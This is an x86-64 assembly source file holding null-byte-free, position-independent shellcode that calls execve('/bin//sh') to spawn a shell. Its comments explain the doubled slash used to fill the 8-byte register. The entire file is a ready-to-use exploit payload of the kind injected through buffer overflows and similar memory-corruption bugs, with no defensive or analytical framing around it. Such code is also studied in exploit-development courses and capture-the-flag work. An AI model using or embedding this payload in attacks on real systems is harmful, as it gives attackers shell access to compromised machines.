//
// execve-bin-sh.s
//
// This is a null-byte-free, position-independent-code that runs execve("/bin//sh").
//
// Note, that double slash is there intentionally in order for the string to fully 
// occupy the rbx register, which is 8 bytes long
//

.text
    .global _start
    _start:
        push %rax
        xor %rdx, %rdx
        xor %rsi, %rsi
        mov $0x68732f2f6e69622f, %rbx ; /bin//sh ascii codes
        push %rbx
        push %rsp
        pop %rdi
        mov $59, %al
        syscall
